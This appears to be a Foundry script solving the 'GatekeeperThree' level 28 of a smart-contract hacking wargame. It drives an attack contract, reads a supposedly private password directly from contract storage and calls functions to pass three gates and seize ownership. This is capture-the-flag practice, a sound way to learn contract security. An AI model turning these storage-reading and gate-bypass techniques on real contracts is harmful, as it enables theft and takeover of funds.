// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../instances/Ilevel28.sol";
import "../src/AttackGateThree.sol";

/**
 * @title POC
 * @author Kent Miguel
 * @notice A script to take control of level 28 contract
 */
contract POC is Script {
    GatekeeperThree level28 =
        GatekeeperThree(payable(0xdcF3e321A839336d7ADDF6a217AcAB20CbF461E9));

    AttackGateThree attackGate =
        AttackGateThree(payable(0x09e06D3e7599C8879Fa4D992C7B67279353a81BB));

    function run() external {
        vm.startBroadcast();
        //run these after deploying AttackGateThree and running:
        attackGate.passGateOne();
        //check owner of GateKeeperThree
        console.log("GATE 1: ");
        console.log("msg.sender: ", msg.sender);
        console.log("owner", level28.owner());
        console.log("tx.origin", tx.origin);

        console.log("GATE 2: ");

        bytes32 _pw2 = vm.load(
            level28.trick().target.address,
            bytes32(uint256(2))
        );

        //check for password
        bool result = level28.trick().checkPassword(uint256(_pw2));
        console.log("Check password result: ", result);

        attackGate.passGateTwo(uint256(_pw2));

        //Directly call getAllowance since its a public function
        level28.getAllowance(uint256(_pw2));

        console.log("Allow_entarance: ", level28.allow_enterance());

        //try to pass gate 3
        //send ether 0.0011 to AttackGateThree (this)
        //attempt to send ether to AttackGateThree contract
        console.log("attack result", attackGate.attack());

        vm.stopBroadcast();
    }
}
